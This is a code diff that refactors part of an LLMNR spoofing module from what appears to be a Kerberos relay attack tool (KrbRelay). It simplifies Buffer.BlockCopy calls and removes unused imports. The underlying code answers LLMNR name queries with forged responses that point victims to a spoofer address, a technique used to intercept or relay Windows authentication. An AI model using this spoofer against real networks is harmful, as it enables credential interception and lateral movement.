@@ -1,6 +1,4 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Linq;
 using System.Text;
 using System.Net;
 using System.Net.Sockets;
@@ -43,25 +41,25 @@ namespace KrbRelay.Spoofing
                 {
                     byte[] udpPayload = llmnrClient.Receive(ref llmnrEndpoint);
                     byte[] llmnrType = new byte[2];
-                    System.Buffer.BlockCopy(udpPayload, (udpPayload.Length - 4), llmnrType, 0, 2);
+                    Buffer.BlockCopy(udpPayload, (udpPayload.Length - 4), llmnrType, 0, 2);
                     int llmnrSourcePort = llmnrEndpoint.Port;
 
                     if (BitConverter.ToString(llmnrType) != "00-1C")
                     {
                         string llmnrResponseMessage = "";
                         byte[] llmnrTransactionID = new byte[2];
-                        System.Buffer.BlockCopy(udpPayload, 0, llmnrTransactionID, 0, 2);
+                        Buffer.BlockCopy(udpPayload, 0, llmnrTransactionID, 0, 2);
                         byte[] llmnrRequest = new byte[udpPayload.Length - 18];
                         byte[] llmnrRequestLength = new byte[1];
-                        System.Buffer.BlockCopy(udpPayload, 12, llmnrRequestLength, 0, 1);
-                        System.Buffer.BlockCopy(udpPayload, 13, llmnrRequest, 0, llmnrRequest.Length);
+                        Buffer.BlockCopy(udpPayload, 12, llmnrRequestLength, 0, 1);
+                        Buffer.BlockCopy(udpPayload, 13, llmnrRequest, 0, llmnrRequest.Length);
                         string llmnrRequestHost = Util.ParseNameQuery(12, udpPayload);
                         IPAddress sourceIPAddress = llmnrEndpoint.Address;
                         llmnrResponseMessage = Util.CheckRequest(llmnrRequestHost, sourceIPAddress.ToString(), IP.ToString(), "LLMNR", null, null);
 
                         if (String.Equals(llmnrResponseMessage, "response sent"))
                         {
-                            byte[] llmnrResponse = LLMNR.GetLLMNRResponse("listener", ipVersion, llmnrTTL, sourceIPAddress, destinationIPAddress, spooferIPData, spooferIPv6Data, Util.IntToByteArray2(llmnrSourcePort), udpPayload, spn);
+                            byte[] llmnrResponse = GetLLMNRResponse("listener", ipVersion, llmnrTTL, sourceIPAddress, destinationIPAddress, spooferIPData, spooferIPv6Data, Util.IntToByteArray2(llmnrSourcePort), udpPayload, spn);
                             IPEndPoint llmnrDestinationEndPoint = new IPEndPoint(sourceIPAddress, llmnrSourcePort);
                             UDP.UDPListenerClient(sourceIPAddress, llmnrSourcePort, llmnrClient, llmnrResponse);
                             llmnrClient = UDP.UDPListener("LLMNR", IP, 5355, ipVersion);
@@ -85,13 +83,13 @@ namespace KrbRelay.Spoofing
             byte[] ttlLLMNR = BitConverter.GetBytes(Int32.Parse(llmnrTTL));
             Array.Reverse(ttlLLMNR);
             byte[] llmnrType = new byte[2];
-            System.Buffer.BlockCopy(udpPayload, (udpPayload.Length - 4), llmnrType, 0, 2);
+            Buffer.BlockCopy(udpPayload, (udpPayload.Length - 4), llmnrType, 0, 2);
             byte[] llmnrTransactionID = new byte[2];
-            System.Buffer.BlockCopy(udpPayload, 0, llmnrTransactionID, 0, 2);
+            Buffer.BlockCopy(udpPayload, 0, llmnrTransactionID, 0, 2);
             byte[] llmnrRequest = new byte[udpPayload.Length - 18];
             byte[] llmnrRequestLength = new byte[1];
-            System.Buffer.BlockCopy(udpPayload, 12, llmnrRequestLength, 0, 1);
-            System.Buffer.BlockCopy(udpPayload, 13, llmnrRequest, 0, llmnrRequest.Length);
+            Buffer.BlockCopy(udpPayload, 12, llmnrRequestLength, 0, 1);
+            Buffer.BlockCopy(udpPayload, 13, llmnrRequest, 0, llmnrRequest.Length);
             MemoryStream llmnrMemoryStream = new MemoryStream();
 
             //Console.WriteLine(String.Format("[{0}] ", ByteArrayToString(llmnrRequest)));
@@ -151,7 +149,5 @@ namespace KrbRelay.Spoofing
 
             return llmnrMemoryStream.ToArray();
         }
-
     }
-
 }
